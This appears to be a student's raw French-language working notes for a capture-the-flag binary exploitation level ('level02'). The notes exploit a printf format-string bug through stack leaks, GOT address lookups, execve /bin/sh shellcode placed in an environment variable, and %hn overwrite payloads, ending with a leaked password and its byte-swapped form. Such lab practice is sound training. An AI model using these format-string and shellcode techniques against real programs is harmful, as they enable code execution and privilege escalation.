On a le printf qui prend en argument l'entree user via fget

On ecrit dans la memoire a partir du 28eme elements

python -c "print 'AAAA' + 28*'%x.'" | ./level02
ou
AAAA %28$x



adresse + NB + %28$N

'\x\x\x\x' + 'd' + '%28$n'

(gdb) x/s 0x00400d32
0x00 40 0d 32:        "/bin/sh"

0x00 60 12 28 <exit@got.plt>

0x00 60 11 f8 <system@got.plt>

essayer d'overflow avec strcspn ????

python -c 'print "AAAA" + 28*"%x."' | ./level02 

level02@OverRide:~$ objdump -R ./level02 | grep exit
0000000000601228 R_X86_64_JUMP_SLOT  exit
level02@OverRide:~$ objdump -T ./level02 | grep exit
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 exit
level02@OverRide:~$ objdump -T ./level02 | grep system
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 system
level02@OverRide:~$ objdump -R ./level02 | grep system
00000000006011f8 R_X86_64_JUMP_SLOT  system


export SHELLCODE="python -c 'print "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"'"
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

find /b 0x7ffffffde000, +21000, 0x48, 0x31
0x7ffff7dd6548
find /b 0x7ffffffde000, +21000, 0x0f, 0x05


echo -e "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" > /tmp/shellcode.bin
export SHELLCODE=$(cat /tmp/shellcode.bin)

env gdb level02


info variable environ

x/gx 

(gdb) x/gx 0x00007fffffffe588

x/50s 0x00007fffffffe7f8

addr shellcode : 0x 7f ff ff ff e8 3c

7fffffffe83c

0x601228 addr exit got.plt

(python -c 'print "\x28\x12\x60" + "\x2a\x12\x60" + "%59084x" + "%28$hn" + "%6204x" + "%29$hn"'; cat) | ./level02

(python -c 'print "\x28\x12\x60" "%140737488349244d" + "%28$hn"'; cat) | ./level02

140737488349244

(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d" + "%4$hn" + "%31904d" + "%5$hn"'; cat) | ./level5

(python -c 'print "\x28\x12\x60" + "\x3a\x12\x60" + "%5245084d" + "%28$hn" + "%2147483647d" + "%29$hn"'; cat) | ./level02

7fffff
ffe83c

8 388 607 - 6 = 8388601
16 771 132 - 8 388 607 = 8382525

(python -c 'print "\x28\x12\x60" + "\x3e\x12\x60" + "%8388601d" + "%28$hn" + "%8382525d" + "%29$hn"'; cat) | ./level02

 %28$p

Hh74RPnuQ9sa5xrEWGs5nGX
47hHunPRas9QErx5sGWXGn

python -c 'print 100 * "%x ."' | ./level02

Hh74RPnuQ9sa5JAEXWNCq7z7sXGnh5J5

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv


Hh74RPnuQ9sa5JAEXWNCq7z7sXGnh5J5M9KfPg3H
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M

(python -c 'print "AAAA"' ; python -c 'print "unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M\x00"') | ./level02

(python -c 'print "level02"'; python -c 'print "Hh74RPnuQ9sa5JAEXWNCq7z7sXGnh5J5M9KfPg3H\n"') | ./level02


756e505234376848 devient 4868373452506e75
45414a3561733951 devient 51397361354a4145
377a7143574e6758 devient 58674e5743717a37
354a35686e475873 devient 7358476e68354a35
48336750664b394d devient 4d394b6650673348


Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H